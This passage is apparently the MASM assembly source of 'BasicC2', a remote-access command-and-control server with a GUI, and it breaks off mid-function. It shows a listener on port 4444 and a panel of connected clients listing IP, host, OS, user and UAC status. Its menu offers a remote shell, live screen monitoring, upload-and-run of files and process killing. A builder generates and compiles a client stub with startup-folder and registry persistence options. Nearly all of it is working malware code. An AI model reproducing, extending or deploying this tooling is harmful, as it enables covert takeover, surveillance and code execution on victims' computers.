include BasicC2.inc

includelib kernel32.lib
includelib user32.lib
includelib gdi32.lib
includelib comctl32.lib
includelib ws2_32.lib
includelib comdlg32.lib
includelib shell32.lib
includelib msvcrt.lib

RegisterMainClass       PROTO
CreateMainWindow        PROTO
CreateListView          PROTO :DWORD
CreateStatusBar         PROTO :DWORD
AddListViewColumns      PROTO
UpdateStatusBar         PROTO
MsgPump                 PROTO
FireServer              PROTO
KillServer              PROTO
AcceptLoop              PROTO :DWORD
NetRecv                 PROTO :DWORD, :DWORD, :DWORD
NetSend                 PROTO :DWORD, :DWORD
PushClient              PROTO :DWORD, :DWORD, :DWORD
GrabDeviceID            PROTO :DWORD, :DWORD
GrabFields              PROTO :DWORD, :DWORD
PushListView            PROTO :DWORD
DoRunFile               PROTO
DoDisconnect            PROTO
NukeAllClients          PROTO
StaleCheck              PROTO
BuilderProc             PROTO :DWORD, :DWORD, :DWORD, :DWORD
PortDlgProc             PROTO :DWORD, :DWORD, :DWORD, :DWORD
RunBuild                PROTO :DWORD
GenStub                 PROTO :DWORD, :DWORD
StubWrite               PROTO :DWORD, :DWORD
WriteBuildBat           PROTO
LiveMonitorThread       PROTO :DWORD
StartLiveMonitor        PROTO :DWORD
MonitorWndProc          PROTO :DWORD, :DWORD, :DWORD, :DWORD
ShowShellWnd            PROTO
ShellWndProc            PROTO :DWORD, :DWORD, :DWORD, :DWORD
RegisterShellClass      PROTO
NetSendRaw              PROTO :DWORD, :DWORD, :DWORD
FindPoolIndex           PROTO :DWORD
RemoveClient            PROTO :DWORD
ExtractResource         PROTO :DWORD, :DWORD

.data

szClassName         db "BC2Main", 0
szWindowTitle       db "BasicC2 - CodedByABOLHB", 0
szLvClass           db "SysListView32", 0
szSbClass           db "msctls_statusbar32", 0
szEditClass         db "EDIT", 0
szStaticClass       db "STATIC", 0
szBtnClass          db "BUTTON", 0

szColIP             db "IP", 0
szColHost           db "Host", 0
szColOS             db "OS", 0
szColUser           db "User", 0
szColUAC            db "UAC", 0

szCtxMon            db "Monitor", 0
szCtxShell2         db "Remote Shell", 0
szCtxRun            db "Run File", 0
szCtxDC             db "Disconnect", 0

szReady             db "Idle", 0
szFmtStatus         db "Listening :%d | %d client(s)", 0
szCmdUR             db "mason_uploadrun", 0
szCmdStop           db "mason_kill_process", 0
szCmdScreenLive     db "mason_screenshot_fast", 0

szApp               db "BasicC2", 0
szMasonGrp          db "MasonGroup", 0
szAboutTxt          db "BasicC2 x86 ASM Edition", 13, 10
                    db "Coded By ABOLHB", 13, 10
                    db "abolhb.com", 0
szErrWS             db "Winsock init failed", 0
szErrSock           db "Socket creation failed", 0
szErrBind           db "Bind failed on port", 0
szErrListen         db "Listen failed", 0
szFmtStarted        db "Listening on :%d", 0
szAlready           db "Already running", 0
szNoSel             db "Select a client first", 0
szBuildOK           db "Built: %s", 0
szTimeoutMsg        db "Client timeout", 0
szDCAsk             db "Kill client process and disconnect?", 0
szUnk               db "Unknown", 0
szFFilter           db "All (*.*)", 0, "*.*", 0, 0
szCfgPath           db "output\client_config.inc", 0
szHostPath          db "output\client_host.inc", 0
szStubDst           db "output\Stub.asm", 0
szRcDst             db "output\Stub.rc", 0
szManDst            db "output\Stub.manifest", 0
szStubExe           db "output\client.exe", 0
szFinalExe          db "client.exe", 0
szClean1            db "output\Stub.asm", 0
szClean2            db "output\Stub.rc", 0
szClean3            db "output\Stub.manifest", 0
szClean4            db "output\Stub.obj", 0
szClean5            db "output\Stub.res", 0
szClean6            db "output\client_config.inc", 0
szClean7            db "output\client_host.inc", 0
szClean8            db "output\_build.bat", 0
szOutputDir         db "output", 0
szBuildBat          db "output\_build.bat", 0
szBuildCmd          db "cmd.exe /c output\_build.bat", 0
szBatContent        db "cd /d %~dp0", 13, 10
                    db "del /q Stub.obj Stub.res client.exe 2>NUL", 13, 10
                    db "C:\masm32\bin\rc Stub.rc", 13, 10
                    db "C:\masm32\bin\ml /c /coff /Cp Stub.asm", 13, 10
szBatContent2       db "C:\masm32\bin\link /SUBSYSTEM:WINDOWS /OUT:client.exe"
                    db " /LIBPATH:C:\masm32\lib Stub.obj Stub.res"
                    db " kernel32.lib user32.lib gdi32.lib"
                    db " ws2_32.lib advapi32.lib shell32.lib"
                    db " msvcrt.lib", 13, 10
                    db "del /q Stub.obj Stub.res 2>NUL", 13, 10, 0
szBuildFail         db "Build failed!", 0
szBuilding          db "Building client...", 0

szDefHost           db "127.0.0.1", 0
szDefPort           db "4444", 0

szCfgFmtPort        db "C2_PORT         equ %s", 13, 10, 0
szCfgFmtPS          db "DO_PERSIST_STARTUP  equ %d", 13, 10, 0
szCfgFmtPD          db "DO_PERSIST_REGISTRY equ %d", 13, 10, 0
szHostFmt           db "szHostEnc   db ", 22h, "%s", 22h, ", 0", 13, 10, 0

szMonClass          db "BC2Mon", 0
szMonTitle          db "Monitor", 0

szShellClass        db "BC2Shell", 0
szShellTitle        db "Remote Shell", 0
szShellSend         db "Send", 0
szShellPrompt       db "> ", 0
szNewLine           db 13, 10, 0
szRunReady          db "READY", 0
szRunOK             db "File sent successfully", 0
szRunFail           db "File send failed", 0
szFileReadErr       db "Cannot read file", 0

szBtnBuilderTxt     db "Builder", 0
szBtnAboutTxt       db "About", 0
.data?

hInst               dd ?
hMain               dd ?
hLV                 dd ?
hSB                 dd ?
hCtxMenu            dd ?

bRunning            dd ?
nPort               dd ?
hSock               dd ?
hThread             dd ?
dwTID               dd ?

wsaD                WSADATA <>
pool                MasonClient MAX_CLIENTS dup(<>)
nClients            dd ?

buf                 db 4096 dup(?)
buf2                db 4096 dup(?)
rxBuf               db 8192 dup(?)
stBuf               db 256 dup(?)
fPath               db MAX_PATH dup(?)
bHost               db 256 dup(?)
bPort               db 32 dup(?)
portBuf             db 16 dup(?)
nSel                dd ?
iccx                INITCOMMONCONTROLSEX <>
fNameBuf            db MAX_PATH dup(?)
nLiveMonIdx         dd ?
bLiveMon            dd ?
hMonWnd             dd ?
hMonThread          dd ?
dwMonTID            dd ?
pMonBuf             dd ?
nMonBufSz           dd ?
bMonClassReg        dd ?

hBtnBuilder         dd ?
hBtnAbout           dd ?

hShellWnd           dd ?
hShellOut           dd ?
hShellIn            dd ?
hShellBtn           dd ?
nShellIdx           dd ?
bShellClassReg      dd ?
shellCmd            db 1024 dup(?)
shellRx             db 65536 dup(?)

.code

start:
    invoke GetModuleHandleA, NULL
    mov hInst, eax

    mov iccx.dwSize, sizeof INITCOMMONCONTROLSEX
    mov iccx.dwICC, ICC_LISTVIEW_CLASSES or ICC_BAR_CLASSES
    invoke InitCommonControlsEx, addr iccx

    invoke WSAStartup, 0202h, addr wsaD
    test eax, eax
    jz @F
    invoke MessageBoxA, 0, addr szErrWS, addr szApp, MB_ICONERROR
    invoke ExitProcess, 1
@@:
    mov bRunning, 0
    mov nPort, 4444
    mov nClients, 0
    mov nSel, -1
    mov bLiveMon, 0
    mov bMonClassReg, 0
    mov bShellClassReg, 0

    invoke DialogBoxParamA, hInst, IDD_PORT, NULL, addr PortDlgProc, 0
    cmp eax, 0
    je _quit

    invoke RegisterMainClass
    test eax, eax
    jz _quit
    invoke CreateMainWindow
    test eax, eax
    jz _quit

    invoke FireServer
    invoke MsgPump

_quit:
    invoke WSACleanup
    invoke ExitProcess, 0

PortDlgProc proc hDlg:DWORD, uMsg:DWORD, wParam:DWORD, lParam:DWORD
    LOCAL wId:DWORD
    LOCAL bOk:DWORD

    .if uMsg == WM_INITDIALOG
            invoke SetDlgItemTextA, hDlg, IDC_PORT_EDIT, addr szDefPort
        invoke GetDlgItem, hDlg, IDC_PORT_EDIT
        invoke SetFocus, eax
        mov eax, TRUE
        ret
    .elseif uMsg == WM_COMMAND
        movzx eax, word ptr wParam
        mov wId, eax
        .if wId == IDC_PORT_OK
            invoke GetDlgItemInt, hDlg, IDC_PORT_EDIT, addr bOk, FALSE
            .if bOk != 0
                mov nPort, eax
                invoke EndDialog, hDlg, 1
            .endif
        .elseif wId == IDCANCEL
            invoke EndDialog, hDlg, 0
        .endif
    .elseif uMsg == WM_CLOSE
        invoke EndDialog, hDlg, 0
    .endif
    xor eax, eax
    ret
PortDlgProc endp

RegisterMainClass proc
    LOCAL wc:WNDCLASSEX
    mov wc.cbSize, sizeof WNDCLASSEX
    mov wc.style, CS_HREDRAW or CS_VREDRAW
    mov wc.lpfnWndProc, offset WndProc
    mov wc.cbClsExtra, 0
    mov wc.cbWndExtra, 0
    push hInst
    pop wc.hInstance
    invoke LoadIconA, hInst, IDI_MAINICON
    mov wc.hIcon, eax
    mov wc.hIconSm, eax
    invoke LoadCursorA, NULL, IDC_ARROW
    mov wc.hCursor, eax
    mov wc.hbrBackground, COLOR_BTNFACE + 1
    mov wc.lpszMenuName, NULL
    mov wc.lpszClassName, offset szClassName
    invoke RegisterClassExA, addr wc
    ret
RegisterMainClass endp

CreateMainWindow proc
    LOCAL sx:DWORD
    LOCAL sy:DWORD
    invoke GetSystemMetrics, 0
    sub eax, 680
    shr eax, 1
    mov sx, eax
    invoke GetSystemMetrics, 1
    sub eax, 380
    shr eax, 1
    mov sy, eax
    invoke CreateWindowExA, \
        0, addr szClassName, addr szWindowTitle, \
        WS_OVERLAPPEDWINDOW or WS_CLIPCHILDREN, \
        sx, sy, 680, 380, \
        NULL, NULL, hInst, NULL
    mov hMain, eax
    test eax, eax
    jz @F
    invoke CreatePopupMenu
    mov hCtxMenu, eax
    invoke AppendMenuA, hCtxMenu, MF_STRING, IDM_CTX_MONITOR, addr szCtxMon
    invoke AppendMenuA, hCtxMenu, MF_STRING, IDM_CTX_SHELL, addr szCtxShell2
    invoke AppendMenuA, hCtxMenu, MF_STRING, IDM_CTX_RUNFILE, addr szCtxRun
    invoke AppendMenuA, hCtxMenu, MF_SEPARATOR, 0, NULL
    invoke AppendMenuA, hCtxMenu, MF_STRING, IDM_CTX_DISCONNECT, addr szCtxDC
    invoke ShowWindow, hMain, SW_SHOWNORMAL
    invoke UpdateWindow, hMain
@@:
    mov eax, hMain
    ret
CreateMainWindow endp

CreateListView proc hP:DWORD
    LOCAL rc:RECT
    invoke GetClientRect, hP, addr rc
    invoke CreateWindowExA, \
        WS_EX_CLIENTEDGE, addr szLvClass, NULL, \
        WS_CHILD or WS_VISIBLE or WS_BORDER or LVS_REPORT or LVS_SINGLESEL or LVS_SHOWSELALWAYS, \
        0, 0, rc.right, rc.bottom, hP, IDC_LISTVIEW, hInst, NULL
    mov hLV, eax
    invoke SendMessageA, hLV, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, \
        LVS_EX_FULLROWSELECT or LVS_EX_GRIDLINES or LVS_EX_HEADERDRAGDROP
    invoke SendMessageA, hLV, LVM_SETBKCOLOR, 0, 00FFFFFFh
    invoke SendMessageA, hLV, LVM_SETTEXTCOLOR, 0, 00000000h
    invoke SendMessageA, hLV, LVM_SETTEXTBKCOLOR, 0, 00FFFFFFh
    invoke AddListViewColumns
    ret
CreateListView endp

AddListViewColumns proc
    LOCAL col:LVCOLUMNA
    mov col.imask, LVCF_FMT or LVCF_WIDTH or LVCF_TEXT or LVCF_SUBITEM
    mov col.fmt, LVCFMT_LEFT

    mov col.lx, 120
    mov col.pszText, offset szColIP
    mov col.iSubItem, 0
    invoke SendMessageA, hLV, LVM_INSERTCOLUMNA, 0, addr col

    mov col.lx, 120
    mov col.pszText, offset szColHost
    mov col.iSubItem, 1
    invoke SendMessageA, hLV, LVM_INSERTCOLUMNA, 1, addr col

    mov col.lx, 100
    mov col.pszText, offset szColOS
    mov col.iSubItem, 2
    invoke SendMessageA, hLV, LVM_INSERTCOLUMNA, 2, addr col

    mov col.lx, 100
    mov col.pszText, offset szColUser
    mov col.iSubItem, 3
    invoke SendMessageA, hLV, LVM_INSERTCOLUMNA, 3, addr col

    mov col.lx, 80
    mov col.pszText, offset szColUAC
    mov col.iSubItem, 4
    invoke SendMessageA, hLV, LVM_INSERTCOLUMNA, 4, addr col
    ret
AddListViewColumns endp

CreateStatusBar proc hP:DWORD
    invoke CreateWindowExA, \
        0, addr szSbClass, NULL, \
        WS_CHILD or WS_VISIBLE or SBARS_SIZEGRIP, \
        0, 0, 0, 0, hP, IDC_STATUSBAR, hInst, NULL
    mov hSB, eax
    invoke SendMessageA, hSB, SB_SETTEXTA, 0, addr szReady
    ret
CreateStatusBar endp

UpdateStatusBar proc
    .if bRunning != 0
        invoke wsprintfA, addr stBuf, addr szFmtStatus, nPort, nClients
        invoke SendMessageA, hSB, SB_SETTEXTA, 0, addr stBuf
    .else
        invoke SendMessageA, hSB, SB_SETTEXTA, 0, addr szReady
    .endif
    ret
UpdateStatusBar endp

WndProc proc hWnd:DWORD, uMsg:DWORD, wParam:DWORD, lParam:DWORD
    LOCAL pt:POINT
    LOCAL rc:RECT
    LOCAL rcS:RECT
    LOCAL wId:DWORD

    .if uMsg == WM_CREATE
        invoke CreateListView, hWnd
        invoke CreateStatusBar, hWnd

        invoke CreateWindowExA, \
            0, addr szBtnClass, addr szBtnBuilderTxt, \
            WS_CHILD or WS_VISIBLE or WS_TABSTOP, \
            0, 0, 80, BTN_BAR_H, \
            hWnd, IDC_BTN_BUILDER, hInst, NULL
        mov hBtnBuilder, eax

        invoke CreateWindowExA, \
            0, addr szBtnClass, addr szBtnAboutTxt, \
            WS_CHILD or WS_VISIBLE or WS_TABSTOP, \
            80, 0, 80, BTN_BAR_H, \
            hWnd, IDC_BTN_ABOUT, hInst, NULL
        mov hBtnAbout, eax

        invoke SetTimer, hWnd, TIMER_STALE_CHECK, 2000, NULL
        xor eax, eax
        ret
    .elseif uMsg == WM_SIZE
        invoke SendMessageA, hSB, WM_SIZE, 0, 0
        invoke GetClientRect, hWnd, addr rc
        invoke GetClientRect, hSB, addr rcS

        mov eax, rc.bottom
        sub eax, rcS.bottom
        sub eax, BTN_BAR_H
        invoke MoveWindow, hLV, 0, 0, rc.right, eax, TRUE

        mov eax, rc.bottom
        sub eax, rcS.bottom
        sub eax, BTN_BAR_H
        invoke MoveWindow, hBtnBuilder, 0, eax, 80, BTN_BAR_H, TRUE

        mov eax, rc.bottom
        sub eax, rcS.bottom
        sub eax, BTN_BAR_H
        invoke MoveWindow, hBtnAbout, 82, eax, 80, BTN_BAR_H, TRUE
        xor eax, eax
        ret
    .elseif uMsg == WM_COMMAND
        movzx eax, word ptr wParam
        mov wId, eax
        .if wId == IDC_BTN_BUILDER || wId == IDM_BUILDER
            invoke DialogBoxParamA, hInst, IDD_BUILDER, hWnd, addr BuilderProc, 0
        .elseif wId == IDC_BTN_ABOUT || wId == IDM_ABOUT
            invoke MessageBoxA, hWnd, addr szAboutTxt, addr szMasonGrp, MB_ICONINFORMATION
        .elseif wId == IDM_CTX_MONITOR
            invoke StartLiveMonitor, nSel
        .elseif wId == IDM_CTX_RUNFILE
            invoke DoRunFile
        .elseif wId == IDM_CTX_DISCONNECT
            invoke DoDisconnect
        .elseif wId == IDM_CTX_SHELL
            invoke ShowShellWnd
        .endif
        xor eax, eax
        ret
    .elseif uMsg == WM_NOTIFY
        mov edx, lParam
        assume edx:ptr NMHDR
        .if [edx].code == NM_RCLICK
            invoke SendMessageA, hLV, LVM_GETNEXTITEM, -1, LVNI_SELECTED
            mov nSel, eax
            .if eax != -1
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_MONITOR, MF_ENABLED
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_SHELL, MF_ENABLED
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_RUNFILE, MF_ENABLED
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_DISCONNECT, MF_ENABLED
            .else
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_MONITOR, MF_GRAYED
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_SHELL, MF_GRAYED
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_RUNFILE, MF_GRAYED
                invoke EnableMenuItem, hCtxMenu, IDM_CTX_DISCONNECT, MF_GRAYED
            .endif
            invoke GetCursorPos, addr pt
            invoke TrackPopupMenu, hCtxMenu, TPM_LEFTALIGN, pt.x, pt.y, 0, hWnd, NULL
        .endif
        assume edx:nothing
        xor eax, eax
        ret
    .elseif uMsg == WM_TIMER
        .if wParam == TIMER_STALE_CHECK
            invoke StaleCheck
        .endif
        xor eax, eax
        ret
    .elseif uMsg == WM_CLOSE
        invoke KillTimer, hWnd, TIMER_STALE_CHECK
        .if bRunning != 0
            invoke KillServer
        .endif
        invoke DestroyWindow, hWnd
        xor eax, eax
        ret
    .elseif uMsg == WM_DESTROY
        invoke PostQuitMessage, 0
        xor eax, eax
        ret
    .else
        invoke DefWindowProcA, hWnd, uMsg, wParam, lParam
        ret
    .endif
    xor eax, eax
    ret
WndProc endp

MsgPump proc
    LOCAL msg:MSG
@@:
    invoke GetMessageA, addr msg, NULL, 0, 0
    test eax, eax
    jle @F
    invoke TranslateMessage, addr msg
    invoke DispatchMessageA, addr msg
    jmp @B
@@:
    mov eax, msg.wParam
    ret
MsgPump endp

FireServer proc
    LOCAL sa:sockaddr_in
    LOCAL opt:DWORD

    .if bRunning != 0
        invoke MessageBoxA, hMain, addr szAlready, addr szApp, MB_ICONINFORMATION
        ret
    .endif

    invoke socket, AF_INET, SOCK_STREAM, IPPROTO_TCP
    cmp eax, INVALID_SOCKET
    jne @F
    invoke MessageBoxA, hMain, addr szErrSock, addr szApp, MB_ICONERROR
    ret
@@:
    mov hSock, eax
    mov opt, 1
    invoke setsockopt, hSock, SOL_SOCKET, SO_REUSEADDR, addr opt, 4

    mov sa.sin_family, AF_INET
    invoke htons, nPort
    mov sa.sin_port, ax
    mov sa.sin_addr, 0
    invoke bind, hSock, addr sa, sizeof sockaddr_in
    .if eax == SOCKET_ERROR
        invoke closesocket, hSock
        invoke MessageBoxA, hMain, addr szErrBind, addr szApp, MB_ICONERROR
        ret
    .endif
    invoke listen, hSock, SOMAXCONN
    .if eax == SOCKET_ERROR
        invoke closesocket, hSock
        invoke MessageBoxA, hMain, addr szErrListen, addr szApp, MB_ICONERROR
        ret
    .endif

    mov bRunning, 1
    invoke CreateThread, NULL, 0, addr AcceptLoop, NULL, 0, addr dwTID
    mov hThread, eax
    invoke UpdateStatusBar
    ret
FireServer endp

KillServer proc
    .if bRunning == 0
        ret
    .endif
    mov bRunning, 0
    invoke closesocket, hSock
    invoke NukeAllClients
    invoke SendMessageA, hLV, LVM_DELETEALLITEMS, 0, 0
    mov nClients, 0
    invoke UpdateStatusBar
    ret
KillServer endp

AcceptLoop proc lpP:DWORD
    LOCAL cSock:DWORD
    LOCAL cAddr:sockaddr_in
    LOCAL aLen:DWORD
    LOCAL kaOn:DWORD
    LOCAL kaIdle:DWORD
    LOCAL kaIntvl:DWORD
    LOCAL kaCnt:DWORD

_al:
    cmp bRunning, 0
    je _ax
    mov aLen, sizeof sockaddr_in
    invoke accept, hSock, addr cAddr, addr aLen
    .if eax == INVALID_SOCKET
        cmp bRunning, 0
        je _ax
        invoke Sleep, 50
        jmp _al
    .endif
    mov cSock, eax

    mov kaOn, 1
    mov kaIdle, 3
    mov kaIntvl, 3
    mov kaCnt, 3
    invoke setsockopt, cSock, SOL_SOCKET, SO_KEEPALIVE, addr kaOn, 4
    invoke setsockopt, cSock, IPPROTO_TCP, TCP_KEEPIDLE, addr kaIdle, 4
    invoke setsockopt, cSock, IPPROTO_TCP, TCP_KEEPINTVL, addr kaIntvl, 4
    invoke setsockopt, cSock, IPPROTO_TCP, TCP_KEEPCNT, addr kaCnt, 4

    invoke NetRecv, cSock, addr rxBuf, 4096
    .if eax <= 0
        invoke closesocket, cSock
        jmp _al
    .endif
    mov byte ptr rxBuf[4095], 0
    invoke PushClient, cSock, addr cAddr, addr rxBuf
    jmp _al
_ax:
    xor eax, eax
    ret
AcceptLoop endp

NetRecv proc uses ebx esi edi, s:DWORD, p:DWORD, mx:DWORD
    LOCAL ml:DWORD
    LOCAL hdr[4]:BYTE
    LOCAL got:DWORD

    invoke recv, s, addr hdr, 4, 0
    .if eax != 4
        xor eax, eax
        ret
    .endif
    movzx eax, byte ptr hdr[0]
    shl eax, 24
    movzx ecx, byte ptr hdr[1]
    shl ecx, 16
    or eax, ecx
    movzx ecx, byte ptr hdr[2]
    shl ecx, 8
    or eax, ecx
    movzx ecx, byte ptr hdr[3]
    or eax, ecx
    mov ml, eax
    mov ecx, mx
    dec ecx
    .if eax <= 0 || eax >= ecx
        xor eax, eax
        ret
    .endif
    mov got, 0
_rd:
    mov eax, ml
    sub eax, got
    .if eax <= 0
        jmp _rx
    .endif
    mov ebx, eax
    mov edi, p
    add edi, got
    invoke recv, s, edi, ebx, 0
    .if eax <= 0
        xor eax, eax
        ret
    .endif
    add got, eax
    jmp _rd
_rx:
    mov edi, p
    add edi, got
    mov byte ptr [edi], 0
    mov eax, got
    ret
NetRecv endp

NetSend proc s:DWORD, pM:DWORD
    LOCAL ml:DWORD
    LOCAL hdr[4]:BYTE

    invoke lstrlenA, pM
    mov ml, eax
    mov eax, ml
    shr eax, 24
    mov hdr[0], al
    mov eax, ml
    shr eax, 16
    mov hdr[1], al
    mov eax, ml
    shr eax, 8
    mov hdr[2], al
    mov eax, ml
    mov hdr[3], al
    invoke send, s, addr hdr, 4, 0
    .if eax == SOCKET_ERROR
        xor eax, eax
        ret
    .endif
    invoke send, s, pM, ml, 0
    .if eax == SOCKET_ERROR
        xor eax, eax
        ret
    .endif
    mov eax, 1
    ret
NetSend endp

PushClient proc uses ebx esi edi, s:DWORD, pA:DWORD, pG:DWORD
    LOCAL idx:DWORD
    LOCAL ipStr:DWORD
    LOCAL dIdx:DWORD
    LOCAL needRebuild:DWORD

    mov esi, pA
    assume esi:ptr sockaddr_in
    push [esi].sin_addr
    assume esi:nothing
    call inet_ntoa
    mov ipStr, eax

    mov needRebuild, 0
    mov dIdx, 0
    lea ebx, pool
_dup:
    cmp dIdx, MAX_CLIENTS
    jge _dup_done
    cmp (MasonClient ptr [ebx]).active, 0
    je _dup_nxt
    lea ecx, (MasonClient ptr [ebx]).ip
    push ebx
    invoke lstrcmpA, ecx, ipStr
    pop ebx
    .if eax == 0
        push ebx
        mov eax, (MasonClient ptr [ebx]).sock
        invoke closesocket, eax
        pop ebx
        mov (MasonClient ptr [ebx]).active, 0
        dec nClients
        mov needRebuild, 1
    .endif
_dup_nxt:
    add ebx, sizeof MasonClient
    inc dIdx
    jmp _dup
_dup_done:

    .if needRebuild != 0
        invoke SendMessageA, hLV, LVM_DELETEALLITEMS, 0, 0
        mov dIdx, 0
        lea ebx, pool
    _rb:
        cmp dIdx, MAX_CLIENTS
        jge _rb_done
        cmp (MasonClient ptr [ebx]).active, 0
        je _rb_nxt
        push ebx
        invoke PushListView, dIdx
        pop ebx
    _rb_nxt:
        add ebx, sizeof MasonClient
        inc dIdx
        jmp _rb
    _rb_done:
    .endif

    mov idx, 0
    lea edi, pool
_fs:
    cmp idx, MAX_CLIENTS
    jge _ns
    cmp (MasonClient ptr [edi]).active, 0
    je _ff
    add edi, sizeof MasonClient
    inc idx
    jmp _fs
_ff:
    push edi
    push ecx
    mov ecx, sizeof MasonClient
    xor al, al
    rep stosb
    pop ecx
    pop edi

    mov (MasonClient ptr [edi]).active, 1
    mov eax, s
    mov (MasonClient ptr [edi]).sock, eax
    lea ecx, (MasonClient ptr [edi]).ip
    invoke lstrcpyA, ecx, ipStr

    invoke GrabDeviceID, pG, edi
    invoke GrabFields, pG, edi

    inc nClients
    invoke PushListView, idx
    invoke UpdateStatusBar
    ret
_ns:
    invoke closesocket, s
    ret
PushClient endp

GrabDeviceID proc uses ebx esi edi, pG:DWORD, pC:DWORD
    mov esi, pG
    mov edi, pC
    lea ebx, (MasonClient ptr [edi]).deviceID
    xor ecx, ecx
_ci:
    cmp ecx, CLIENT_ID_LEN - 1
    jge _di
    mov al, [esi + ecx]
    cmp al, 0
    je _di
    cmp al, '|'
    je _ti
    mov [ebx + ecx], al
    inc ecx
    jmp _ci
_ti:
    .while ecx > 0
        dec ecx
        .if byte ptr [ebx + ecx] != ' '
            inc ecx
            .break
        .endif
    .endw
_di:
    mov byte ptr [ebx + ecx], 0
    ret
GrabDeviceID endp

GrabFields proc uses ebx esi edi, pG:DWORD, pC:DWORD
    mov edi, pC
    mov esi, pG

    mov ebx, esi
_ff:
    cmp byte ptr [ebx], 0
    je _sd
    cmp byte ptr [ebx], 'f'
    jne _nf
    cmp byte ptr [ebx+1], 'r'
    jne _nf
    cmp byte ptr [ebx+2], 'o'
    jne _nf
    cmp byte ptr [ebx+3], 'm'
    jne _nf
    cmp byte ptr [ebx+4], ' '
    je _gf
_nf:
    inc ebx
    jmp _ff
_gf:
    add ebx, 5
    lea ecx, (MasonClient ptr [edi]).hostname
    xor edx, edx
_ch:
    cmp edx, CLIENT_STR_LEN - 1
    jge _hd
    mov al, [ebx + edx]
    cmp al, 0
    je _hd
    cmp al, '('
    je _hd
    .if al == ' '
        cmp byte ptr [ebx + edx + 1], '('
        je _hd
    .endif
    mov [ecx + edx], al
    inc edx
    jmp _ch
_hd:
    .if edx > 0
        .if byte ptr [ecx + edx - 1] == ' '
            dec edx
        .endif
    .endif
    mov byte ptr [ecx + edx], 0

    mov ebx, esi
_fo:
    cmp byte ptr [ebx], 0
    je _od
    cmp byte ptr [ebx], '('
    jne _no
    cmp byte ptr [ebx+1], 'O'
    jne _no
    cmp byte ptr [ebx+2], 'S'
    jne _no
    cmp byte ptr [ebx+3], ':'
    je _go
_no:
    inc ebx
    jmp _fo
_go:
    add ebx, 5
    lea ecx, (MasonClient ptr [edi]).osName
    xor edx, edx
_co:
    cmp edx, CLIENT_STR_LEN - 1
    jge _od2
    mov al, [ebx + edx]
    cmp al, 0
    je _od2
    cmp al, ')'
    je _od2
    mov [ecx + edx], al
    inc edx
    jmp _co
_od2:
    mov byte ptr [ecx + edx], 0
    jmp _fu
_od:
    lea ecx, (MasonClient ptr [edi]).osName
    invoke lstrcpyA, ecx, addr szUnk

_fu:
    mov ebx, esi
_fut:
    cmp byte ptr [ebx], 0
    je _ud
    cmp byte ptr [ebx], '('
    jne _nu
    cmp byte ptr [ebx+1], 'U'
    jne _nu
    cmp byte ptr [ebx+2], 's'
    jne _nu
    cmp byte ptr [ebx+3], 'e'
    jne _nu
    cmp byte ptr [ebx+4], 'r'
    jne _nu
    jmp _gu
_nu:
    inc ebx
    jmp _fut
_gu:
    add ebx, 7
    lea ecx, (MasonClient ptr [edi]).userName
    xor edx, edx
_cu:
    cmp edx, CLIENT_STR_LEN - 1
    jge _ud2
    mov al, [ebx + edx]
    cmp al, 0
    je _ud2
    cmp al, ')'
    je _ud2
    mov [ecx + edx], al
    inc edx
    jmp _cu
_ud2:
    mov byte ptr [ecx + edx], 0

    mov ebx, esi
_fwv:
    cmp byte ptr [ebx], 0
    je _wvd
    cmp byte ptr [ebx], '('
    jne _nwv
    cmp byte ptr [ebx+1], 'W'
    jne _nwv
    cmp byte ptr [ebx+2], 'i'
    jne _nwv
    cmp byte ptr [ebx+3], 'n'
    jne _nwv
    cmp byte ptr [ebx+4], 'V'
    jne _nwv
    jmp _gwv
_nwv:
    inc ebx
    jmp _fwv
_gwv:
    add ebx, 9
    lea ecx, (MasonClient ptr [edi]).winVer
    xor edx, edx
_cwv:
    cmp edx, CLIENT_STR_LEN - 1
    jge _wvd2
    mov al, [ebx + edx]
    cmp al, 0
    je _wvd2
    cmp al, ')'
    je _wvd2
    mov [ecx + edx], al
    inc edx
    jmp _cwv
_wvd2:
    mov byte ptr [ecx + edx], 0
    ret

_wvd:
    lea ecx, (MasonClient ptr [edi]).winVer
    invoke lstrcpyA, ecx, addr szUnk
    ret

_ud:
    lea ecx, (MasonClient ptr [edi]).userName
    invoke lstrcpyA, ecx, addr szUnk
    lea ecx, (MasonClient ptr [edi]).winVer
    invoke lstrcpyA, ecx, addr szUnk
    ret

_sd:
    lea ecx, (MasonClient ptr [edi]).hostname
    invoke lstrcpyA, ecx, addr szUnk
    lea ecx, (MasonClient ptr [edi]).osName
    invoke lstrcpyA, ecx, addr szUnk
    lea ecx, (MasonClient ptr [edi]).userName
    invoke lstrcpyA, ecx, addr szUnk
    lea ecx, (MasonClient ptr [edi]).winVer
    invoke lstrcpyA, ecx, addr szUnk
    ret
GrabFields endp

PushListView proc uses esi, ci:DWORD
    LOCAL v:LVITEMA
    LOCAL ri:DWORD

    mov eax, ci
    mov ecx, sizeof MasonClient
    mul ecx
    lea esi, pool
    add esi, eax

    invoke SendMessageA, hLV, LVM_GETITEMCOUNT, 0, 0
    mov ri, eax

    mov v.imask, LVIF_TEXT
    push ri
    pop v.iItem
    mov v.state, 0
    mov v.stateMask, 0
    mov v.iImage, 0
    mov v.lParam, 0

    mov v.iSubItem, 0
    lea eax, (MasonClient ptr [esi]).ip
    mov v.pszText, eax
    invoke SendMessageA, hLV, LVM_INSERTITEMA, 0, addr v

    mov v.iSubItem, 1
    lea eax, (MasonClient ptr [esi]).hostname
    mov v.pszText, eax
    invoke SendMessageA, hLV, LVM_SETITEMA, 0, addr v

    mov v.iSubItem, 2
    lea eax, (MasonClient ptr [esi]).osName
    mov v.pszText, eax
    invoke SendMessageA, hLV, LVM_SETITEMA, 0, addr v

    mov v.iSubItem, 3
    lea eax, (MasonClient ptr [esi]).userName
    mov v.pszText, eax
    invoke SendMessageA, hLV, LVM_SETITEMA, 0, addr v

    mov v.iSubItem, 4
    lea eax, (MasonClient ptr [esi]).winVer
    mov v.pszText, eax
    invoke SendMessageA, hLV, LVM_SETITEMA, 0, addr v
    ret
PushListView endp

FindPoolIndex proc uses edi, lvIdx:DWORD
    LOCAL cnt:DWORD
    mov cnt, 0
    lea edi, pool
    xor ecx, ecx
_fpi:
    cmp ecx, MAX_CLIENTS
    jge _fpn
